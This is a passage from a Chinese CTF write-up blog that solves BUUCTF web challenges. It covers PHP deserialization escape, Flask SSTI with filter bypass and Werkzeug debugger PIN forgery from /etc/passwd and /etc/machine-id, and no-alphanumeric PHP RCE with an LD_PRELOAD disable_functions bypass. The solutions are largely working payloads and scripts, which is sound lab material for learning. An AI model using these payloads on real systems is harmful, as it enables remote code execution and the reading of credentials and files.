&quot;upload/394659692a460258b45a99f1424ea357&quot; &#125;</span><br><span class="line">过滤后字符串反序列化, 可以看到这里成功逃逸了</span><br><span class="line">array(4) &#123; [&quot;phone&quot;]=&gt; string(11) &quot;13333333333&quot; [&quot;email&quot;]=&gt; string(11) &quot;abc@123.com&quot; [&quot;nickname&quot;]=&gt; array(1) &#123; [0]=&gt; string(210) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot; &#125; [&quot;photo&quot;]=&gt; string(11) &quot;profile.php&quot; &#125;</span><br><span class="line">成功</span><br></pre></td></tr></table></figure><p>多读取几个文件试试(注意在修改读取的文件名时,其长度的值也要改, <code>where</code>的数量也要改,长度+1,<code>where</code>的数量就要+1)</p><img src="/images/buuctf-web2/image-20221023234449637.png" alt="image-20221023234449637" style="zoom:67%;" /><p>读取完成后需要去 <code>profile.php</code>中查看源码,然后将读取到的<code>base64编码</code>解码</p><p>最后在<code>config.php</code>中找到flag</p><p>测试脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;a.jpg&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&quot;13333333333&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;abc@123.com&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>][] = <span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\&quot;;&#125;s:5:\&quot;photo\&quot;;s:10:\&quot;config.php\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>; <span class="comment"># 构造正则匹配表达式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><hr><br><h1 id="SSTI-Flask的pin-FlaskApp"><a href="#SSTI-Flask的pin-FlaskApp" class="headerlink" title="[SSTI,Flask的pin]FlaskApp"></a>[SSTI,Flask的pin]FlaskApp</h1><p><code>base64</code>解码页面随便输入点东西,无法解码时会爆错, 报出一些路径和源码</p><img src="/images/buuctf-web2/image-20221024151141347.png" alt="image-20221024151141347" style="zoom:67%;" /><p>尝试旁边的打开shell选项,提示需要输入PIN码来解锁<img src="/images/buuctf-web2/image-20221024151516929.png" alt="image-20221024151516929" style="zoom:67%;" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can find the PIN printed out on the standard output of your shell that runs the server. </span><br></pre></td></tr></table></figure><p>随便输入PIN并抓个包:</p><img src="/images/buuctf-web2/image-20221024151744306.png" alt="image-20221024151744306" style="zoom:67%;" /><p>下拉菜单还能打开:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>) <span class="comment"># 通过post来传的text</span></span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) : <span class="comment"># 有过滤</span></span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">res =  render_template_string(tmp) <span class="comment"># render函数,存在SSTI</span></span><br></pre></td></tr></table></figure><p>那么现在在解密页面输入一些SSTI的payload试试:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入: e3s3Kjd9fQ==   &#123;&#123;7*7&#125;&#125;</span><br><span class="line">输出: nonono </span><br><span class="line"></span><br><span class="line">输入: e3s3Kzd9fQ==  &#123;&#123;7+7&#125;&#125;</span><br><span class="line">输出 14</span><br><span class="line">说明 存在对*的过滤</span><br><span class="line"></span><br><span class="line">输入: e3tjb25maWd9fQ==  &#123;&#123;config&#125;&#125;</span><br><span class="line">输出:</span><br><span class="line"> &amp;lt;Config &#123;&amp;#39;ENV&amp;#39;: &amp;#39;production&amp;#39;, &amp;#39;DEBUG&amp;#39;: True, &amp;#39;TESTING&amp;#39;: False, &amp;#39;PROPAGATE_EXCEPTIONS&amp;#39;: None, &amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;#39;: None, &amp;#39;SECRET_KEY&amp;#39;: &amp;#39;s_e_c_r_e_t_k_e_y&amp;#39;, &amp;#39;PERMANENT_SESSION_LIFETIME&amp;#39;: datetime.timedelta(days=31), &amp;#39;USE_X_SENDFILE&amp;#39;: False, &amp;#39;SERVER_NAME&amp;#39;: None, &amp;#39;APPLICATION_ROOT&amp;#39;: &amp;#39;/&amp;#39;, &amp;#39;SESSION_COOKIE_NAME&amp;#39;: &amp;#39;session&amp;#39;, &amp;#39;SESSION_COOKIE_DOMAIN&amp;#39;: False, &amp;#39;SESSION_COOKIE_PATH&amp;#39;: None, &amp;#39;SESSION_COOKIE_HTTPONLY&amp;#39;: True, &amp;#39;SESSION_COOKIE_SECURE&amp;#39;: False, &amp;#39;SESSION_COOKIE_SAMESITE&amp;#39;: None, &amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;#39;: True, &amp;#39;MAX_CONTENT_LENGTH&amp;#39;: None, &amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;#39;: datetime.timedelta(seconds=43200), &amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;#39;: None, &amp;#39;TRAP_HTTP_EXCEPTIONS&amp;#39;: False, &amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;#39;: False, &amp;#39;PREFERRED_URL_SCHEME&amp;#39;: &amp;#39;http&amp;#39;, &amp;#39;JSON_AS_ASCII&amp;#39;: True, &amp;#39;JSON_SORT_KEYS&amp;#39;: True, &amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;#39;: False, &amp;#39;JSONIFY_MIMETYPE&amp;#39;: &amp;#39;application/json&amp;#39;, &amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;: None, &amp;#39;MAX_COOKIE_SIZE&amp;#39;: 4093, &amp;#39;BOOTSTRAP_USE_MINIFIED&amp;#39;: True, &amp;#39;BOOTSTRAP_CDN_FORCE_SSL&amp;#39;: False, &amp;#39;BOOTSTRAP_QUERYSTRING_REVVING&amp;#39;: True, &amp;#39;BOOTSTRAP_SERVE_LOCAL&amp;#39;: False, &amp;#39;BOOTSTRAP_LOCAL_SUBDOMAIN&amp;#39;: None&#125;&amp;gt;</span><br><span class="line"> </span><br><span class="line">SECRET_KEY: s_e_c_r_e_t_k_e_y</span><br></pre></td></tr></table></figure><p>这里拿爆出来的<code>SECRET_KEY</code>使用脚本解密了几个<code>session</code>,并没有得到什么有价值的信息:</p><p><img src="/images/buuctf-web2/image-20221024160704060.png" alt="image-20221024160704060"></p><p>继续试试payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).__dict__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">执行时会爆nonono, 使用字符串拼接的方法一个一个排除关键词:</span><br><span class="line">将import, os, popen都换成字符串拼接的形式后,执行成功</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).__dict__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">输出:</span><br><span class="line">app bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys this_is_the_flag.txt tmp usr var</span><br><span class="line">接下来读取flag: (这里发现flag也被过滤了,所以用同样的方法绕过):</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).__dict__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;cat /this_is_the_fl&#x27;+&#x27;ag.txt&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><p>所以说提示里说要用到PIN,也没用到… 搜搜其他解法:</p><blockquote><p>PIN是 <code>Werkzeug</code>（它是<code> Flask</code> 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。 <strong>您可以使用浏览器中的调试器引脚来启动交互式调试器。</strong></p><p>请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。</p><p>调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。</p><p><code>werkzeug</code>不同版本以及<code>python</code>不同版本都会影响PIN码的生成</p></blockquote><p>如果需要伪造PIN码,需要:</p><ul><li><code>username</code>, 读取<code>/etc/passwd</code>获得</li><li><code>modname</code>,默认值是<code>flask.app</code></li><li><code>appname</code>,默认值是<code>Flask</code></li><li>10进制的mac地址, 通过<code>/sys/class/net/eth0/address</code>获得十六进制格式,再转为10进制</li><li><code>machine_id</code> :读取文件<code>/etc/machine-id </code> 或者 <code>/proc/sys/kernel/random/boot_id 3./proc/self/cgroup</code></li><li><code>flask/app.py</code>的路径, 常见的有:<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code>,通过报错等信息获得</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">输出中找到了一个名为 flaskweb的可疑用户</span><br><span class="line"></span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/sys/class/net/eth0/address&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">输出mac地址56:08:f5:2f:90:51, 转为10进制:94596473262161</span><br><span class="line"></span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/machine-id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">machine-id: 1408f836b0ca514d796cbf8960e45fa1</span><br></pre></td></tr></table></figure><p>运行脚本,生成pin:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;94596473262161&#x27;</span>,  <span class="comment"># mac地址  str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出: 961-361-247</span></span><br></pre></td></tr></table></figure><p>在报错页面输入pin之后,成功进入python的交互页面:</p><p><img src="/images/buuctf-web2/image-20221024164345369.png" alt="image-20221024164345369"></p><br><hr><br><h1 id="无字母数字rce-disable-function绕过-RCE-ME"><a href="#无字母数字rce-disable-function绕过-RCE-ME" class="headerlink" title="[无字母数字rce,disable_function绕过]RCE ME"></a>[无字母数字rce,disable_function绕过]RCE ME</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure><p>很直白,过滤了字母数字, 需要进行无字母数字的<code>rce</code></p><p><strong>利用取反性质来构造命令执行, 每一个字符取反之后都会变成另一个字符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造目标 eval($_POST[1])</span></span><br><span class="line"><span class="comment">//这里构造完之后执行会使网页爆500崩溃...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造目标 assert(eval($_POST[1]))</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;assert&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;eval(\$_POST[1])&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B --assert</span></span><br><span class="line"><span class="comment">//%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6 --eval(\$_POST[1])</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//那么: assert(eval($_POST[1]))就是:</span></span><br><span class="line"><span class="comment">//?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接下来在post中传参: 1=phpinfo();</span></span><br></pre></td></tr></table></figure><p>成功执行</p><img src="/images/buuctf-web2/image-20221024213819145.png" alt="image-20221024213819145" style="zoom:67%;" /><p>那么现在通过url和<code>post</code>参数就可以使用蚁剑连接了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ce4afe32-8659-4ef4-ad14-633769a475a9.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web2/image-20221024214143688.png" alt="image-20221024214143688"></p><p>但是因为这里开启了禁用函数<code>disable_functions</code>所以连接上 蚁剑之后也无法执行命令</p><p>而且这里直接打开flag什么也看不见,应该是需要执行旁边的readflag才行</p><p><img src="/images/buuctf-web2/image-20221024215657536.png" alt="image-20221024215657536"></p><p><img src="/images/buuctf-web2/image-20221024215334052.png" alt="image-20221024215334052"></p><p>这里使用<code>disable_function</code>的绕过工具:</p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>将这两个文件<code>bypass_disablefunc.php</code>和<code>bypass_disablefunc_x64.so</code>上传到目标上(这里<code>/tmp</code>具有上传权限)</p><img src="/images/buuctf-web2/image-20221024223546603.png" alt="image-20221024223546603" style="zoom:50%;" /><img src="/images/buuctf-web2/image-20221024221953485.png" alt="image-20221024221953485" style="zoom:80%;" /><p>这里上传后需要访问到刚刚上传的php文件,并get传参执行命令:</p><blockquote><p>一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 &#x2F;tmp&#x2F;xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。此外，bypass_disablefunc.php 拼接命令和输出路径成为完整的命令行，所以你不用在 cmd 参数中重定向。</p></blockquote><p>这里我们无法访问到<code>/tmp</code>目录的文件,所以通过刚刚的方法,在<code>POST</code>中执行一个文件包含函数:</p><p>然后再按照要求传<code>cmd</code>,<code>outpath</code>,<code>sopath</code>这三个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ce4afe32-8659-4ef4-ad14-633769a475a9.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/tmp/bypass_disablefunc_x64.so</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">1=include(%27/tmp/shell.php%27);</span><br></pre></td></tr></table></figure><p>命令被成功执行:</p><p><img src="/images/buuctf-web2/image-20221024223414176.png" alt="image-20221024223414176"></p><br><hr><br><h1 id="php字符串解析-套娃"><a href="#php字符串解析-套娃" class="headerlink" title="[php字符串解析]套娃"></a>[php字符串解析]套娃</h1><p>源码中, 第一关:…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]; </span><br><span 